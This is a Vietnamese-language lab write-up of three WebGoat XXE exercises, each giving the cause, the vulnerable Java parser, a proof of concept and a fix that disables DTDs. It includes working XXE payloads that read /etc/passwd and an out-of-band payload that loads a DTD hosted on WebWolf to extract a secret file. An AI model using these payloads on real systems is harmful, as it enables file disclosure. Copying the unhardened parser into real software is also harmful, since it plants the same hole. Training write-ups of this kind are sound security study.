# (A5) XXE

# XXE 4

## Nguyên nhân lỗi

- Lập trình viên không kiểm tra đầu vào của xml
- Không tắt tính năng Document Type Definition (DTD), khiến cho kẻ tấn công có thể injection vào XML bằng cách chèn DTD.

```java
// ...
protected Comment parseXml(String xml) throws XMLStreamException, JAXBException {
    var jc = JAXBContext.newInstance(Comment.class);
    var xif = XMLInputFactory.newInstance();

    if (webSession.isSecurityEnabled()) {
      xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
      xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // compliant
    }

    var xsr = xif.createXMLStreamReader(new StringReader(xml));

    var unmarshaller = jc.createUnmarshaller();
    return (Comment) unmarshaller.unmarshal(xsr);
  }
  // ...
```

## POC

- Bắt một request khi gửi Review

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image.png)

- Thêm DTD vào phần xml của request để có thể đọc được file /etc/passwd

```xml
<?xml version="1.0"?>
<!DOCTYPE text [
  <!ENTITY payload SYSTEM "file:///etc/passwd">
]>
<comment>  
	<text>&payload;</text>
</comment>
```

- Gửi request đi

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image%201.png)

## Cách khắc phục

- Kiểm tra lại input XML được gửi đến từ phía client để xem có bị tấn công XXE hay không
- Tắt tính năng DTD của XML

```java
protected Comment parseXml(String xml) throws XMLStreamException, JAXBException {
    var jc = JAXBContext.newInstance(Comment.class);
    var xif = XMLInputFactory.newInstance();

    xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
    xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // compliant
    xif.setProperty(XMLInputFactory.SUPPORT_DTD, false); // Disable DTDs entirely
    xif.setProperty("javax.xml.stream.isSupportingExternalEntities", false); // Prevent external entities

    var xsr = xif.createXMLStreamReader(new StringReader(xml));

    var unmarshaller = jc.createUnmarshaller();
    return (Comment) unmarshaller.unmarshal(xsr);
  }
```

# XXE 7

## Nguyên nhân lỗi

- Lập trình viên sử dụng cả 2 Content-Type là `application/json` và `application/xml` cho dữ liệu được gửi đến từ phía Client. Tuy nhiên khi xử lý Content-Type là **application/xml**, thì lập trình viên lại mắc phải lỗi như **XXE 1**

## POC

- Bắt một request khi gửi Review. Lúc này Content-Type là `application/json`

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image%202.png)

- Đổi Content-Type thành `application/xml` , và Body thành xml như dưới

```xml
<?xml version="1.0"?>
<!DOCTYPE text [
  <!ENTITY payload SYSTEM "file:///etc/passwd">
]>
<comment>  
	<text>&payload;</text>
</comment>
```

- Send request và bypass

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image%203.png)

## Cách khắc phục

- Như của XXE 4

# XXE 11

## Nguyên nhân lỗi

- Nguyên nhân chính dẫn đến lỗi vẫn như 2 lab trên, tuy nhiên ở lab này có thêm logic để không hiển thị nội dung file cần đọc nếu như phát hiện “**nội dung của file cần đọc có chứa nội dung của comment”**
- Chính việc so sánh này dẫn đến việc hacker có thể chèn thêm một nội dung trong payload tấn công XXE để nó không là chuỗi con của file cần đọc và có thể bypass được logic này.

```java
Comment comment = comments.parseXml(commentStr);
if (fileContentsForUser.contains(comment.getText())) {
  comment.setText("Nice try, you need to send the file to WebWolf");
}
comments.addComment(comment, false);
```

## POC

- Tạo một file DTD có nội dung bên dưới và upload lên WebWolf để host. DTD này có nhiệm vụ là sẽ đọc nội dung file secret.txt và lưu trữ vào entity secret.

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image%204.png)

- Bắt Request và injection payload XXE như bên dưới

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image%205.png)

- Entity blindxxe được sử dụng để inject dtd ở phía trên đang được host ở WebWolf - Chính là nội dung file cần đọc đã được lưu trong entity `secret` .
- Lúc này chỉ cần chèn thêm một chuỗi bất kỳ để nội dung được gửi đến server sẽ không là chuỗi con của nội dung file `secret.txt`.

```xml
<?xml version="1.0"?>
<!DOCTYPE xxe [
<!ENTITY % blindxxe SYSTEM "http://localhost:9090/WebWolf/files/shr3wd/test4.dtd">
%blindxxe;
]>
<comment><text>secret &secret;</text></comment>
```

- Gửi request và reload lại trang để đọc được nội dung của file trong phần comment.

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image%206.png)